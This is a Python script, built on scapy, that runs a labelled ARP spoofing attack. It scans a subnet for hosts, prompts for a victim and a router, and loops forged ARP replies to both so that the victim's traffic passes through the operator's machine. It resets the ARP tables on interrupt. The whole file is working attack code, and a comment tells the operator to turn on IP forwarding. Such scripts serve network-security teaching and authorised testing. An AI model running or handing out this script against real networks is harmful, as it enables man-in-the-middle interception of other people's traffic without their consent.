#!/usr/bin/env python3

from scapy.all import *
import subprocess
import time
import sys

def Spoof(ip,mac,rtr):
    #
    # Masquerade as Router/Host to Target IP
    #
    print()
    #
    print("[*] Sending packet to -> < %s | %s > " % (ip,mac))
    #
    time.sleep(1)
    #
    pkt = ARP(op=2,pdst=ip,hwdst=mac,psrc=rtr)
    #
    send(pkt,verbose=False)

def RestoreTable(dst,dst_mac,src,src_mac):
    #
    pkt = ARP(op=2,pdst=dst,hwdst=dst_mac,psrc=src,hwsrc=src_mac)
    #
    print("[*] Restoring ARP Table [*]")
    #
    time.sleep(1)
    #
    send(pkt,count=4,verbose=False)

def ScanNetwork(net):
    #
    ARPRequest = ARP(pdst=net)
    #
    Broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    #
    ARPBroadcast = Broadcast/ARPRequest
    #
    ans = srp(ARPBroadcast,timeout=1,verbose=False)[0]
    #
    print("Host\t\t\t MAC Address")
    #
    print("-----------\t\t -----------------")
    #
    for entity in ans:
        #
        print(entity[1].psrc,"\t\t",entity[1].hwsrc)

def main():
    #
    # Port Forwarding-> echo 1 > /proc/sys/net/ipv4/ip_forward
    #
    print("[*] ARP Spoofing Module [*]")
    #
    print()
    #
    print("[!] Remember to set port forwarding [!]")
    #
    print()
    #
    network = input("[+] Enter the network in CIDR notation-> ")
    #
    print()
    #
    print("[*] Network set to: %s " % network)
    #
    print()
    #
    print("[*] Gathering Hosts [*]")
    #
    print()
    #
    time.sleep(1)
    #
    ScanNetwork(network)
    #
    print()
    #
    victim = input("[+] Enter the victim's IP-> ")
    #
    victim_mac = input("[+] Enter the victim's MAC address-> ")
    #
    router = input("[+] Enter the router IP-> ")
    #
    router_mac = input("[+] Enter the router MAC address-> ")
    #
    print('''
          Attack Parameters
          ------------------------------------
          [*] Victim IP : %s
          [*] Victim MAC: %s
          [*] Router IP : %s
          [*] Router MAC: %s
          ------------------------------------
          ''' % (victim,victim_mac,router,router_mac))
    #
    print()
    #
    print("[*] Initiating ARP Spoofing Attack [*]")
    #
    print()
    #
    time.sleep(1)
    #
    try:
        #
        while(True):
            #
            print("[*] Spoofing Host [*]")
            #
            time.sleep(1)
            #
            Spoof(victim,victim_mac,router)
            #
            print()
            #
            time.sleep(1)
            #
            print("[*] Spoofing Router [*]")
            #
            time.sleep(1)
            #
            Spoof(router,router_mac,victim)
            #
            print()
            #
            time.sleep(1)
            #
            subprocess.call(['clear'])
            #
    except KeyboardInterrupt:
        #
        print("[!] Interrupt Detected [!]")
        #
        print("[*] Restoring Victim's ARP Table [*]")
        #
        RestoreTable(victim,victim_mac,router,router_mac)
        #
        print("[*] Restoring Gateway's ARP Table [*]")
        #
        RestoreTable(router,router_mac,victim,victim_mac)




if(__name__ == '__main__'):
    #
    main()
